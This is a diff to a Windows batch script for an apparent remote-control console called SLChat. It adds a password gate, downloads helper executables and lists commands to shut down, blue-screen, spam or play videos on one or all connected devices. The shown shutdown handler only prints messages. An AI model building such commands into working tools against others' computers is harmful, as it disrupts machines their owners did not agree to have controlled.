@@ -96,6 +96,8 @@ if exist "Plugins" (
 mkdir "Plugins"
 
 cURL -L --output "Plugins/TypeWriter.exe" --url "https://github.com/Batch-Man/TypeIt/blob/main/Src/Files/typewriter.exe?raw=true"
+echo.
+cURL -L --output "Plugins/StrSplit.exe" --url "https://github.com/Batch-Man/StrSplit/raw/refs/heads/main/bin/StrSplit.exe"
 ping localhost -n 3 > nul
 cd "Plugins"
 cls
@@ -154,7 +156,7 @@ if "%_canPass%" == "false" (
 ) else (
     echo   !green_black!^| WHITELISTED USER : ACCESS GRANTED ^|!reset!
 )
-echo.
+::echo.
 echo.
 Call "TypeWriter" "  > Password required for user '%username%'" 15
 echo.
@@ -226,7 +228,7 @@ if not exist "!_dataPATH!" (
     timeout /t 5 > nul
     exit
 )
-echo.
+::echo.
 Call TypeWriter " > Searching for COMMS file..." 15
 echo.
 ping localhost -n 2 > nul
@@ -291,47 +293,91 @@ echo  ╠═══════════════════════�
 echo  ║ !blue_black!                            COMMAND OPTIONS                              !reset! ║
 echo  ║                                                                           ║
 echo  ║ ■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■ ║
-echo  ║ $connect id --Connects to the specific device                             ║
-echo  ║ $connect ALL --Connects to all active devices                             ║
-echo  ║ $checkactive id --Checks if the specific device is active                 ║
-echo  ║ $checkactive ALL --Checks if all devices are active                       ║
+echo  ║ $shutdown id/all --Shutsdown the specific device                          ║
+echo  ║ $bsod id/all --Triggers blue screen of death on the specific device       ║
+echo  ║ $gspam id/all --Spam opens google on the specific device                  ║
+echo  ║ $tts id/all TEXT --Text to speech on the specified device                 ║
+echo  ║ $karbala id/all --Launches special karbala video on the specified device  ║
+echo  ║ $checkactive id/all --Checks if the specific device is active             ║
+echo  ║ $FIX_COMMS --FIX/RESET ALL COMMS FILES INCASE OF ERROR                    ║
+echo  ║ $exit --Exits SLChat                                                      ║
 echo  ║ ■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■ ║
 echo  ╚═══════════════════════════════════════════════════════════════════════════╝
 :: Clean up
 del temp.vbs
-echo.
-%PRINT%{255;255;255} 
-set /p _mainMenuInput="► "
 goto :process_command_MM
 
 :process_command_MM
-@echo off
-setlocal EnableDelayedExpansion
+%chcp_on%
+set "_mainMenuInput="
+set /a _count=0
+set "arg_1="
+set "arg_2="
+echo.
+%PRINT%{255;255;255} 
+set /p _mainMenuInput="► "
+%chcp_off%
 
-:: Define your string and delimiter
-set string=Hello World from Batch
-set delimiter= 
-
-:: Use mshta to execute JavaScript, splitting the string and writing results to a text file
-for /f "delims=" %%a in ('mshta "javascript:
-    var str='%string%';
-    var delimiter='%delimiter%';
-    var result = str.split(delimiter);
-    for (var i = 0; i < result.length; i++) {
-        console.log(result[i]); // Output each part to stdout
-    }
-    window.close();"') do (
-    set /a count+=1
-    set part_!count!=%%a
+for /f "tokens=*" %%A in ('StrSplit " " "!_mainMenuInput!"') do (
+    set /a _count+=1
+    set "arg_!_count!=%%A"
 )
 
-
-pause
-
-echo There are %count% parts:
-for /l %%i in (1,1,%count%) do (
-    echo Part %%i: !part_%%i!
+if "!_mainMenuInput!" == "" (
+    goto process_command_MM
 )
 
-endlocal
+for /f "delims=" %%A in ('powershell -Command "[Console]::WriteLine('!arg_1!'.ToLower())"') do set "arg_1=%%A"
+
+if "!arg_1!" == "exit" ( exit )
+
+if "!arg_1!" == "$shutdown" (
+    if "!arg_2!" == "" (
+        echo.
+        %PRINT%{255;255;255}  Invalid command usage, please specify the device id.\n
+        %PRINT%{255;255;255}  Usage: $shutdown [DEVICE_ID: string] [DELAY: number]\n
+        goto process_command_MM
+    )
+
+    for /f "delims=" %%A in ('powershell -Command "[Console]::WriteLine('!arg_2!'.ToLower())"') do set "arg_2=%%A"
+    
+    if "!arg_2!" == "all" (
+        echo.
+        if "!arg_3!" == "" (
+            Call TypeWriter "  > Shutting down ALL ACTIVE DEVICES.." 15
+            
+            echo.
+            goto process_command_MM
+        )
+
+        set /a _delay=!arg_3! 2>nul
+        if "!_delay!" == "!arg_3!" (
+            ::arg3 IS a number
+            Call TypeWriter "  > Shutting down ALL ACTIVE DEVICES with a DELAY of !_delay! seconds.." 15
+
+            echo.
+            goto process_command_MM
+        ) else (
+            ::arg3 IS NOT a number
+            %PRINT%{255;255;255}  Invalid command usage, DELAY must be a number.\n
+            %PRINT%{255;255;255}  Usage: $shutdown [DEVICE_ID: string] [DELAY: number]\n
+            goto process_command_MM
+        )
+        
+    )
+
+    echo.
+    Call TypeWriter "  > Shutting down device: !arg_2!.." 15
+    echo.
+
+    goto process_command_MM
+)
+
+goto :process_command_MM
+
+
+:connect_devices_all
+cls
+
+
 pause > nul
